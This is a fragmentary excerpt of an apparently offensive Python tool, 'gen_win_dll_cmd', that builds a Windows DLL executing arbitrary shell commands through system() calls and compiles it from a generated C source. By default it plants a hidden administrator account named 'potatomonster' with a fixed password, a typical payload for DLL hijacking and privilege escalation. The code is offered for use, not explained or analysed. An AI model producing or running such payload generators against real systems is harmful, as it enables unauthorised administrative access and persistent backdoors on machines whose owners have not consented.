...
if __name__ == "__main__":
    ...
    prog = Prog(
        "gen_win_dll_cmd",
        "Generates a Windows DLL that runs shell commands. Default is to create a 32-bit executable to add a new administrator \"potatomonster\" with password \"potato\"", [
    ...
    # Generate source
    source_p = Path("/tmp/gen_win_dll_cmd.c")
    source_p.touch()
    print(f"[i] Generating source file in {str(source_p)}:\n-----")
    
    commands_src = ""
    for command in commands:
        commands_src += f"\tsystem(\"{command}\");\n"
    c_src = DLL_SRC_TEMPLATE.substitute(commands=commands_src)
    ...
    result = subprocess.run(
        [compiler, str(source_p), "-o", str(exe_p.resolve()), "--shared"],
        stdin=None,
        stdout=None,
